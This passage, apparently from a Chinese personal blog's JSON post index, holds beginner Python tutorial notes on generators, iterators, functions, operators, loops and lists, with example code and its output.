'done'\n\na = fib(6)\nprint(fib(6))\n\n运行结果：\n&lt;generator object fib at 0x000001C03AC34FC0>\n\n\n下面用3个例子说明用for…in 循环的好处，但是拿不到return 语句的返回值，那么就会报错，所以为了不让报错，就要进行异常处理，拿到返回值，如果想要拿到返回值，必须捕获StopIteration错误，而返回值包含在StopIteration的value中。\n1. 使用__next__()方法到最后一个的下一个时会报错。\n\ndef fib(max):\n    n,a,b =0,0,1\n    while n &lt; max:\n        yield b\n        a,b =b,a+b\n        n = n+1\n    return 'done'\n\na = fib(6)\nprint(fib(6))\nprint(a.__next__())\nprint(a.__next__())\nprint(a.__next__())\nprint(\"可以顺便干其他事情\")\nprint(a.__next__())\nprint(a.__next__())\nprint(a.__next__())\nprint(a.__next__())\n\n结果：\n&lt;generator object fib at 0x01058B70>\n1\n1\n2\n可以顺便干其他事情\n3\n5\n8\nTraceback (most recent call last):       //看到报错，并且 StopIteration: done\n  File \"3.py\", line 18, in &lt;module>\n    print(a.__next__())\nStopIteration: done\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\n\n2. 在上面fib的例子，我们在循环过程中不断调用yield，就会不断中断。当然要给循环设置一个条件来退出循环，\n   不然就会产生一个无限数列出来。把函数改成generator后，我们基本上从来不会用next()来获取下一个\n   返回值，而是直接使用for循环来迭代，但是拿不到return 语句的返回值：\n\ndef fib(max):\n    n,a,b =0,0,1\n    while n &lt; max:\n        yield b\n        a,b =b,a+b\n        n = n+1\n    return 'done'\nfor i in fib(6):\n    print(i)\n\n结果：\n1\n1\n2\n3\n5\n8             //程序没报错，但是拿不到return返回的值。\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\n\n3. 如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：\n\ndef fib(max):\n    n,a,b =0,0,1\n    while n &lt; max:\n        yield b\n        a,b =b,a+b\n        n = n+1\n    return 'done'\ng = fib(6)\nwhile True:\n    try:\n        x = next(g)\n        print('generator: ',x)\n    except StopIteration as e:\n        print(\"生成器返回值：\",e.value)\n        break\n\n\n结果：\ngenerator:  1\ngenerator:  1\ngenerator:  2\ngenerator:  3\ngenerator:  5\ngenerator:  8\n生成器返回值： done      //拿到了return的返回值！\n\n\n\n三. 迭代器\n迭代就是循环，迭代器功能是把一个可迭代的对象转换为生成器。因为生成器本身就是可迭代的。迭代器包含有next方法的实现，在正确的范围内返回期待的数据以及超出范围后能够抛出StopIteration的错误停止迭代。\n\n\n\n可以直接作用于for循环的数据类型有以下几种：\n一类是集合数据类型：如list,tuple,dict,set,str等；\n一类是generator：包括生成器和带yield的generator 函数。\n\n\n\n3.1 可迭代对象这些可以直接作用于for 循环的对象统称为可迭代对象：Iterable可以使用 isinstance() 判断一个对象是否为可Iterable对象！\n查阅：[Python isinstance() 函数]\n\n语法\nisinstance(object, classinfo)\n参数object – 实例对象。classinfo – 可以是直接或间接类名、基本类型或者由它们组成的元组。\n返回值如果两个参数类型（classinfo）相同则返回 True，否则返回 False。\n\n\n3.2 迭代器一个实现了iter方法的对象时可迭代的，一个实现next方法的对象是迭代器可以被next()函数调用并不断返回下一个值的对象称为迭代器：Iterator。可以使用isinstance()判断一个对象是否是Iterator对象\n所以，整体的流程为：\n\n使用isinstance()判断一个对象是否为Iterable对象（可迭代对象），语法为isinstance(对象,Iterable)。返回Ture/False。\n\n如果返回 Ture，使用 iter(可迭代对象) 即可得到返回值为生成器的东西。\n\n然后就可以把这个返回值作为生成器去尽情的使用了。\n\n\n\n查阅：[Python iter() 函数]\n\n总结：\n\n凡是可作用于for循环的对象都是Iterable类型；\n凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。\n生成器都是Iterator对象，但list、dict、str虽然是Iterable（可迭代对象），却不是Iterator（迭代器）。\niter()返回值是迭代器对象。\n\n\n\n举例子：\nfrom collections.abc import Iterable,Iterator\nprint(isinstance('abc', Iterable))\nprint(isinstance([], Iterable))\nprint(isinstance({}, Iterable))\nprint(isinstance((x for x in range(10)), Iterable))\nprint(isinstance(100, Iterable))\n\nprint('\\n')\n\nprint(isinstance((x for x in range(10)), Iterator))\nprint(isinstance([], Iterator))\nprint(isinstance({}, Iterator))\nprint(isinstance('abc', Iterator))\n\nprint('\\n')\n\nprint(isinstance(iter([]), Iterator))\nprint(isinstance(iter('abc'), Iterator))\n\n运行结果：\nTrue\nTrue\nTrue\nTrue\nFalse\n\n\nTrue\nFalse\nFalse\nFalse\n\n\nTrue\nTrue\n\n","thumbnail":"https://i.loli.net/2019/03/03/5c7aadc5c06f9.jpg","plink":"https://Directoree.github.io/post/Python-generator-iterator/"},{"title":"Python-函数","date":"2019-03-02T06:18:58.000Z","updated":"2019-03-03T11:33:20.285Z","content":"有两种定义函数的方法，千万不要忘了冒号和return   ( ´⚰︎` )\n\n\n函数 \n\n\n\n\n\n函数分为：内置（系统）函数和自定义函数。\n\n自定义函数又分为普通（有名字的）函数和匿名（无名字的）函数，二者定义方式不一样；\n自定义和函数里面还可嵌套定义其他函数，匿名函数定义时是一条语句，并且要赋值给一个变量指针。\n普通函数的函数体如果为空，则必须放入一条pass语句，否则会报错；函数体不为空的必须有return语句，否则会报错。\n\n\n\n\n一. 定义函数\n自定义函数简单的规则：\n\n函数代码块以 def 关键词开头，依次写出函数名、括号、括号中的参数和冒号:。\n函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。\n函数内容以冒号起始，并且缩进写代码块结构。\n用return [表达式]结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。还可以返回多个值，如return x,y\n\n\n\n语法\n\nPython 定义函数使用 def 关键字，默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。一般格式如下：\ndef 函数名（参数列表）:\n    函数体\n\n\n以自定义一个求绝对值的my_abs函数为例：\ndef my_abs(x):\n    if x >= 0:\n        return x\n    else:\n        return -x\n\n运行结果：\n99\n\n\n\n二. 参数传递在 python 中，类型属于对象，变量是没有类型的：a=[1,2,3]a=&quot;Runoob&quot;以上代码中，[1,2,3] 是 List 类型，”Runoob” 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。\n\n一、可更改(mutable)与不可更改(immutable)对象\n\n在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。\npython 函数的参数传递：\n\n不可变类型：类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。\n\n可变类型：类似 c++ 的引用传递（地址），如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响\n\n\n\npython 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。\n\n\npython 传不可变对象实例:\ndef ChangeInt( a ):\n    a = 10\n\nb = 2\nChangeInt(b)\nprint( b ) # 结果是 2\n\n\n\n实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它。\n\n\n\n传可变对象实例:\n# 可写函数说明\ndef changeme( mylist ):\n   \"修改传入的列表\"\n   mylist.append([1,2,3,4])\n   print (\"函数内取值1: \", mylist)\n   mylist.append(5)\n   print (\"函数内取值2: \", mylist)\n   return\n\n# 调用changeme函数\nmylist = [10,20,30]\nchangeme( mylist )\nprint (\"函数外取值: \", mylist)\n\n运行结果：\n函数内取值1:  [10, 20, 30, [1, 2, 3, 4]]\n函数内取值2:  [10, 20, 30, [1, 2, 3, 4], 5]\n函数外取值:  [10, 20, 30, [1, 2, 3, 4], 5]\n\n\n二、参数\n\n以下是调用函数时可使用的正式参数类型：\n\n必需参数：调用函数时以正确的顺序传入函数。调用时的数量必须和声明时的一样。\n\n关键字参数：允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。\n\n默认参数：定义函数时可指定参数值，调用函数时，如果没有传递参数，则会使用默认参数。\n\n不定长参数：能处理比当初声明时更多的参数，这些参数被包装进一个元组或字典，通常，这些 可变 参数是参数列表中的最后一个，因为它们将把所有的剩余输入参数传递给函数。\n\n\n\n1. 必需参数：\n\n必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。\n调用printme()函数，你必须传入一个参数，不然会出现语法错误：\n#可写函数说明\ndef printme( str ):\n   \"打印任何传入的字符串\"\n   print (str)\n   return\n\n#调用printme函数\nprintme()\n\n以上实例输出结果：\nTraceback (most recent call last):\n  File \"test.py\", line 10, in &lt;module>\n    printme()\nTypeError: printme() missing 1 required positional argument: 'str'\n\n\n2. 关键字参数：\n\n关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。\n使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。以下实例中演示了函数参数的使用不需要使用指定顺序：\n#可写函数说明\ndef printinfo( name, age ):\n   \"打印任何传入的字符串\"\n   print (\"名字: \", name)\n   print (\"年龄: \", age)\n   return\n\n#调用printinfo函数\nprintinfo( age=50, name=\"runoob\" )\n\n以上实例输出结果：\n名字:  runoob\n年龄:  50\n\n\n3. 默认参数：\n\n调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值：\n#可写函数说明\ndef printinfo( name, age = 35 ):\n   \"打印任何传入的字符串\"\n   print (\"名字: \", name)\n   print (\"年龄: \", age)\n   return\n\n#调用printinfo函数\nprintinfo( age=50, name=\"runoob\" )\nprint (\"------------------------\")\nprintinfo( name=\"runoob\" )\n\n以上实例输出结果：\n名字:  runoob\n年龄:  50\n------------------------\n名字:  runoob\n年龄:  35\n\n\n4. 不定长参数：\n\n\n你可能需要一个函数能处理比当初声明时更多的参数：\n\n加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。\n加了两个星号**的参数会以字典(dict)的形式导入。\n声明函数时，参数中星号 * 可以单独出现。\n如果单独出现星号 * 后的参数必须用关键字传入。\n\n\n\n\n加了星号*的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。\n\n# 可写函数说明\ndef printinfo( arg1, *vartuple ):\n   \"打印任何传入的参数\"\n   print (\"输出: \")\n   print (arg1)\n\n   for var in vartuple:\n      print (\"循环输出: \")\n      print (var)\n   return\n\n# 调用printinfo 函数\nprintinfo( 10 )\nprintinfo( 70, 60, 50 )\n\n输出结果：\n输出:\n10\n输出:\n70\n循环输出:\n60\n循环输出:\n50\n\n\n\n加了两个星号**的参数会以字典的形式导入。\n\n# 可写函数说明\ndef printinfo( arg1, **vardict ):\n   \"打印任何传入的参数\"\n   print (\"输出: \")\n   print (arg1)\n   print (vardict)\n\n# 调用printinfo 函数\nprintinfo(1, a=2,b=3)\n\n以上实例输出结果：\n1\n{'a': 2, 'b': 3}\n\n\n\n声明函数时，参数中星号 * 可以单独出现，例如:\n\ndef f(a,b,*,c):\n    return a+b+c\n\n\n\n如果单独出现星号 * 后的参数必须用关键字传入。\n\ndef f(a,b,*,c):\n    return a+b+c\n\na = f(1,2,3)   # 报错\nprint(a)\n\n报错如下：\nTraceback (most recent call last):\n  File \"&lt;stdin>\", line 1, in &lt;module>\nTypeError: f() takes 2 positional arguments but 3 were given\n\n改正方式：\na = f(1,2,c=3) # 正常\n6\n\n\n\n三. 匿名函数python 使用 lambda 来创建匿名函数。\n\n\n所谓匿名，意即不再使用 def 语句这样标准的形式定义一个函数。\n\nlambda 只是一个表达式，函数体比 def 简单很多。\nlambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。\nlambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。\n\n\n\n语法lambda 函数的语法只包含一个语句，如下：\nlambda [arg1 [,arg2,.....argn]]:expression\n\n\n如下实例：\n# 可写函数说明\nsum = lambda arg1, arg2: arg1 + arg2\n\n# 调用sum函数\nprint (\"相加后的值为 : \", sum( 10, 20 ))\nprint (\"相加后的值为 : \", sum( 20, 20 ))\n\n以上实例输出结果：\n相加后的值为 :  30\n相加后的值为 :  40\n\n\n\n四. 变量作用域Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。\n变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称。Python的作用域一共有4种，分别是：\n\nL （Local） 局部作用域\nE （Enclosing） 闭包函数外的函数中(函数A中定义了函数B，A定义的变量对B来说是闭包函数外的函数)\nG （Global） 全局作用域\nB （Built-in） 内置作用域（内置函数所在模块的范围）\n\n以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内置中找。\ng_count = 0  # 全局作用域\ndef outer():\n    o_count = 1  # 闭包函数外的函数中\n    def inner():\n        i_count = 2  # 局部作用域\n\n\nPython 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问，如下代码：\nif True:\n    msg = 'I am from Runoob'\n\nprint(msg)\n\n输出结果：\nI am from Runoob\n\n\n\n实例中 msg 变量定义在 if 语句块中，但外部还是可以访问的。如果将 msg 定义在函数中，则它就是局部变量，外部不能访问。\n\n\n\n五. 全局变量和局部变量定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。\n局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：\ntotal = 0 # 这是一个全局变量\n# 可写函数说明\ndef sum( arg1, arg2 ):\n    #返回2个参数的和.\"\n    total = arg1 + arg2 # total在这里是局部变量.\n    print (\"函数内是局部变量 : \", total)\n    return total\n\n#调用sum函数\nsum( 10, 20 )\nprint (\"函数外是全局变量 : \", total)\n\n以上实例输出结果：\n函数内是局部变量 :  30\n函数外是全局变量 :  0\n\n\nglobal 和 nonlocal关键字\n\n\nglobal：内部作用域使用全局变量，并且可以修改，作用影响全局；\nnonlocal：函数A嵌套函数B，函数B使用函数A的变量，并且可以修改，作用影响函数A的这个变量；\n\n\n当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。\n\n以下实例修改全局变量 num：\nnum = 1\ndef fun1():\n    global num  # 需要使用 global 关键字声明\n    print(num) \n    num = 123\n    print(num)\nfun1()\nprint(num)\n\n以上实例输出结果：\n1\n123\n123\n\n\n\n如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：\n\ndef outer():\n    num = 10\n    def inner():\n        nonlocal num   # nonlocal关键字声明\n        num = 100\n        print(num)\n    inner()\n    print(num)\nouter()\n\n以上实例输出结果：\n100\n100\n\n\n\n六. 非公开函数\n外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。\n\n类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；\n之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。\nprivate函数或变量不应该被别人引用，那它们有什么用呢？请看例子：\ndef _private_1(name):\n    return 'Hello, %s' % name\n\ndef _private_2(name):\n    return 'Hi, %s' % name\n\ndef greeting(name):\n    if len(name) > 3:\n        return _private_1(name)\n    else:\n        return _private_2(name)\n\n\n我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：\n外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public\n","thumbnail":"https://i.loli.net/2019/03/01/5c78f736c03de.jpg","plink":"https://Directoree.github.io/post/Python-Function/"},{"title":"Python-运算符","date":"2019-03-01T07:06:47.000Z","updated":"2019-03-01T07:08:22.714Z","content":"要常来骚扰…₍ ..̮ ₎ ₍ ..̮ ₎\n\n\n运算符 \n\n\n\nPython语言支持以下类型的运算符:\n\n算术运算符\n\n比较（关系）运算符\n\n赋值运算符\n\n逻辑运算符\n\n位运算符\n\n成员运算符\n\n身份运算符\n\n运算符优先级\n\n\n\n\n\n\n\n 一. 算术运算符\n\n\n运算符\n描述\n实例\n\n\n\n\n+\n加 - 两个对象相加\na + b 输出结果 30\n\n\n-\n减 - 得到负数或是一个数减去另一个数\na - b 输出结果 -10\n\n\n*\n乘 - 两个数相乘或是返回一个被重复若干次的字符串\na * b 输出结果 200\n\n\n/\n除 - x除以y\nb / a 输出结果 2\n\n\n%\n取模 - 返回除法的余数\nb % a 输出结果 0\n\n\n**\n幂 - 返回x的y次幂\na**b 为10的20次方，输出结果 100000000000000000000\n\n\n//\n取整除 - 返回商的整数部分（向下取整）\n&gt;&gt;&gt;&gt; 9//24&gt;&gt;&gt; -9//2-5\n\n\n\n\n\n 二. 比较运算符以下假设变量a为10，变量b为20：\n\n\n\n运算符\n描述\n实例\n\n\n\n\n==\n等于 - 比较对象是否相等\n(a == b) 返回 False。\n\n\n!=\n不等于 - 比较两个对象是否不相等\n(a != b) 返回 True。\n\n\n>\n大于 - 返回x是否大于y\n(a &gt; b) 返回 False。\n\n\n&lt;\n小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。注意，这些变量名的大写。\n(a &lt; b) 返回 True。\n\n\n>=\n大于等于 - 返回x是否大于等于y。\n(a &gt;= b) 返回 False。\n\n\n&lt;=\n小于等于 - 返回x是否小于等于y。\n(a &lt;= b) 返回 True。\n\n\n\n\n\n三. 赋值运算符以下假设变量a为10，变量b为20：\n\n\n\n运算符\n描述\n实例\n\n\n\n\n=\n简单的赋值运算符\nc = a + b 将 a + b 的运算结果赋值为 c\n\n\n+=\n加法赋值运算符\nc += a 等效于 c = c + a\n\n\n-=\n减法赋值运算符\nc -= a 等效于 c = c - a\n\n\n*=\n乘法赋值运算符\nc *= a 等效于 c = c * a\n\n\n/=\n除法赋值运算符\nc /= a 等效于 c = c / a\n\n\n%=\n取模赋值运算符\nc %= a 等效于 c = c % a\n\n\n**=\n幂赋值运算符\nc **= a 等效于 c = c ** a\n\n\n//=\n取整除赋值运算符\nc //= a 等效于 c = c // a\n\n\n\n\n\n四. 位运算符按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下：\n下表中变量 a 为 60，b 为 13二进制格式如下：\n\n\n\n\na = 0011 1100\n\n\n\nb = 0000 1101\n\n\n\na&amp;b = 0000 1100\n\n\n\na丨b = 0011 1101\n\n\n\na^b = 0011 0001\n\n\n\n~a  = 1100 0011\n\n\n\n\n\n\n\n运算符\n描述\n实例\n\n\n\n\n&amp;\n按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0\n(a &amp; b) 输出结果 12 二进制解释： 0000 1100\n\n\n丨\n按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。\n(a 丨 b) 输出结果 61 二进制解释： 0011 1101\n\n\n^\n按位异或运算符：当两对应的二进位相异时，结果为1\n(a ^ b) 输出结果 49 二进制解释： 0011 0001\n\n\n~\n按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。~x 类似于 -x-1\n(~a ) 输出结果 -61 二进制解释： 1100 0011 在一个有符号二进制数的补码形式。\n\n\n&lt;&lt;\n左移动运算符：运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。\na &lt;&lt; 2 输出结果 240 二进制解释： 1111 0000\n\n\n>>\n右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，“&gt;&gt;”右边的数指定移动的位数\na &gt;&gt; 2 输出结果 15 二进制解释： 0000 1111\n\n\n\n\n\n五. 逻辑运算符Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:\n\n\n\n运算符\n逻辑表达式\n描述\n实例\n\n\n\n\nand\nx and y\n布尔”与” - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。\n(a and b) 返回 20。\n\n\nor\nx or y\n布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。\n(a or b) 返回 10。\n\n\nnot\nnot x\n布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。\nnot(a and b) 返回 False\n\n\n\n\n\n六. 成员运算符除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。\n\n\n\n运算符\n描述\n实例\n\n\n\n\nin\n如果在指定的序列中找到值返回 True，否则返回 False。\nx 在 y 序列中 , 如果 x 在 y 序列中返回 True。\n\n\nnot in\n如果在指定的序列中没有找到值返回 True，否则返回 False。\nx 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。\n\n\n\n\n\n七. 身份运算符身份运算符用于比较两个对象的存储单元。注：[id() 函数] 用于获取对象内存地址。\nis 与 == 区别：is 用于判断两个变量引用对象是否为同一个， == 用于判断引用变量的值是否相等。\n\n\n\n运算符\n描述\n实例\n\n\n\n\nis\nis 是判断两个标识符是不是引用自一个对象\nx is y, 类似 id(x) == id(y) 。 如果引用的是同一个对象则返回 True，否则返回 False\n\n\nis not\nis not 是判断两个标识符是不是引用自不同对象\nx is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。\n\n\n\n\n\n八. 运算符优先级以下表格列出了从最高到最低优先级的所有运算符：\n\n\n\n运算符\n描述\n\n\n\n\n**\n指数 (最高优先级)\n\n\n~ + -\n按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)\n\n\n* / % //\n乘，除，取模和取整除\n\n\n+ -\n加法减法\n\n\n>>\n&lt;&lt;    右移，左移运算符\n\n\n&amp;\n位 ‘AND’\n\n\n^ 丨\n位运算符\n\n\n&lt;= &lt; &gt; &gt;=\n比较运算符\n\n\n&lt;&gt; == !=\n等于运算符\n\n\n= %= /= //= -= += *= **=\n赋值运算符\n\n\nis is not\n身份运算符\n\n\nin not in\n成员运算符\n\n\nand or not\n逻辑运算符\n\n\n\n","thumbnail":"https://i.loli.net/2019/03/01/5c7816b14bc26.jpg","plink":"https://Directoree.github.io/post/Python-Operators/"},{"title":"Python-条件语句与循环","date":"2019-03-01T03:29:20.000Z","updated":"2019-03-01T07:11:19.281Z","content":"记得冒号和换行的缩进呀…(｡◕︎‿◕︎)ﾉﾟ･ﾟ･\n\n\n条件语句与循环 \n\n\n\n一. 条件语句\n\nif-else-elif是条件语句，判断bool类型，判断为True就继续执行后面的缩进语句，判断为Flase则不执行缩进语句。\n\nPython程序语言指定任何非0和非空（Null）值为True，0 或者 null为False。\n\nPython只执行if-elif-else 结构中的一个代码块，它依次检查每个条件测试，直到遇到通过了的条件测试。测试通过后，Python将执行紧跟在它后面的代码，并跳过余下的测试。\n\npython 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。\n\n设置if 语句的格式。在条件测试的格式设置方面，PEP 8提供的唯一建议是，在诸如== 、&gt;= 和&lt;= 等比较运算符两边各添加一个空格，例如，if age &lt; 4: 要比if age&lt;4: 好。这样的空格不会影响Python对代码的解读，而只是让代码阅读起来更容易。\n\n注意条件语句如果有多条缩进语句时不能忘了冒号（ : ），不像C语言或其它语言一样，if后面没有括号。\n\n\n\n书写格式如下：\nif &lt;条件判断1>:\n    &lt;执行1>\nelif &lt;条件判断2>:\n    &lt;执行2>\nelif &lt;条件判断3>:\n    &lt;执行3>\nelse:\n    &lt;执行4>\n\n\n\n二. 循环语句\nPython提供了for循环和while循环（在Python中没有do..while循环）:\n\n\n\n循环类型\n描述\n\n\n\n\nwhile 循环\n在给定的判断条件为 true 时执行循环体，否则退出循环体。\n\n\nfor 循环\n重复执行语句\n\n\n嵌套循环\n你可以在while循环体中嵌套for循环\n\n\n\n\n循环控制语句循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：\n\n\n\n循环类型\n描述\n\n\n\n\nbreak 语句\n在语句块执行过程中终止循环，并且跳出整个循环\n\n\ncontinue 语句\n在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。\n\n\npass 语句\npass是空语句，是为了保持程序结构的完整性。\n\n\n\n\n2.1 While 循环语句执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（Null）的值均为True。当判断条件假False时，循环结束。其基本形式为（注意并没有括号）：\nwhile 判断条件：\n    执行语句……\n\n\nGif 演示 Python while 语句执行过程：\n\n\n循环使用 else 语句：\n\n在 python 中，while … else 在循环条件为 False 时执行 else 语句块：\n# -*- coding: utf-8 -*-\ncount = 0\nwhile count &lt; 5:\n   print (count, \" is  less than 5\")\n   count = count + 1\nelse:\n   print (count, \" is not less than 5\")\n\n运行结果：\n0  is  less than 5 \n1  is  less than 5 \n2  is  less than 5 \n3  is  less than 5 \n4  is  less than 5 \n5  is not less than 5 \n\n\n\n2.2 for..in 语句\nPython for循环可以遍历任何序列的项目，如一个列表或者一个字符串。\n\nPython 中的 for 语句和 C 或 Pascal 中的略有不同。通常的循环可能会依据一个等差数值步进过程（如 Pascal），或由用户来定义迭代步骤和中止条件（如 C ），Python 的 for 语句依据任意序列（列表或字符串）中的子项，按它们在序列中的顺序来进行迭代。\n\n在迭代过程中修改迭代序列不安全（只有在使用列表这样的可变序列时才会有这样的情况）。如果你想要修改你迭代的序列（例如，复制选择项），你可以迭代它的复本。使用切割标识就可以很方便的做到这一点\n\n\n\n\nfor…in语句处理字符串和列表不同：\n\n处理列表：每次取列表的一个元素赋给 in 前面的变量；\n处理字符串：每次取字符串的一个字符赋给 in 前面的变量；\n\n\n# -*- coding: utf-8 -*-\nfor x in [1, 2, 3, 4, 5, 6]:\n    print(x)\n\nfor x in 'beauty':\n     print(x)\n\n运行结果：\n1 \n2 \n3 \n4 \n5 \n6 \nb \ne \na \nu \nt \ny \n\n\n\n上例列表 for x in …循环就是把每个元素代入变量x，然后执行缩进块的语句。这就像把序列中的每一个数(或对象)分配给x，一次一个,然后为每个x值执行语句块。\n\n\n2.2 break、continue、pass 语句break语句： 在循环中，可以提前退出循环。\nbreak语句： 在循环过程中，跳过当前的这次循环，直接开始下一次循环。\npass语句： pass 是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句。\n    \nPython 语言 pass 语句语法格式如下：\n# -*- coding: utf-8 -*-\n# 输出 Python 的每个字母\nfor letter in 'Python':\n   if letter == 'h':\n      pass\n      print('这是 pass 块')\n   print('当前字母 :', letter)\n\nprint('Good bye!')\n\n运行结果：\n当前字母 : P \n当前字母 : y \n当前字母 : t \n这是 pass 块 \n当前字母 : h \n当前字母 : o \n当前字母 : n \nGood bye! \n\n","thumbnail":"https://i.loli.net/2019/03/01/5c780b7be7025.jpg","plink":"https://Directoree.github.io/post/Python-ConditionalStatements-loops/"},{"title":"Python-列表、元组、字典、集合","date":"2019-02-28T12:28:00.000Z","updated":"2019-03-02T09:10:23.177Z","content":"Python的列表相当于数组 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾\n\n\nPython 列表、元组、字典、集合 \n\n\n\n\n一. 认识列表\n\n列表（list）是什么：\n\n序列是Python中最基本的数据结构。\n在Python中，用方括号 [ ] 来表示列表，并用逗号来分隔其中的元素。并且列表的数据项（各个元素）不需要具有相同的类型。\n序列中的每个元素都分配一个数字 - 它的位置，即索引，第一个索引是0，第二个索引是1，依此类推。\n序列都可以进行的操作包括索引，切片，加，乘，检查成员。\n此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。\n\n\n把列表当作堆栈使用。涉及的方法有：append()、pop()\n访问和使用列表可以使用切片。[a:b]\n把列表当作队列使用（不过使用起来较麻烦，可自行百度）。\n列表可以嵌套使用。\n列表复制是这样的：list2 = list1[:]\n获取列表的索引值：a = list.index(&quot;String&quot;)\n\n\n\n定义列表的示例：\nlist1 = ['physics', 'chemistry', 1997, 2000]\nlist2 = [1, 2, 3, 4, 5 ]\nlist3 = [\"a\", \"b\", \"c\", \"d\"]\nprint(list1)\nprint(list2)\nprint(list3)\n\n运行结果：\n['physics', 'chemistry', 1997, 2000] \n[1, 2, 3, 4, 5] \n['a', 'b', 'c', 'd'] \n\n\n\n二. 切片\n切片和索引：\n\n与字符串的索引一样，列表索引从0开始。(在字符串那个章节总结过)列表可以进行截取、组合等；\n你还可以处理列表的部分元素——Python称之为切片。使用下标索引来访问列表中的值，同样你也可以使用方括号[ ]的形式截取字符； [x:y]\n要创建切片，可指定要使用的第一个元素和最后一个元素的索引。与函数range() 一样，Python在到达你指定的第二个索引前面的元素后停止。要输出列表中的前三个元素，需要指定索引0~3，这将输出分别为0 、1 和2 的元素； [1:5]表示索引为1,2,3,4的四个元素\n如果你没有指定第一个索引，Python将自动从列表开头开始； [ :6]\n要让切片终止于列表末尾，也可使用类似的语法，即不指定第二个索引； [2: ]无论列表多长，这种语法都能够让你输出从特定位置到列表末尾的所有元素。\n如果要遍历列表的部分元素，可在for 循环中使用切片。\n\n\n\n下面示例代码（注意“//”不代表注释，仅仅为了展示）：\nlist1 = ['physics', 'chemistry', 1997, 2000]\nlist2 = [1, 2, 3, 4, 5, 6, 7 ]\n\nprint(list1[1],list1[-2])           //类似字符串一样使用索引\nprint (\"list1[0]: \", list1[0])      //输出第一个元素\nprint (\"list2[1:5]: \", list2[1:5])  //输出索引为1到（5-1）的元素\nprint 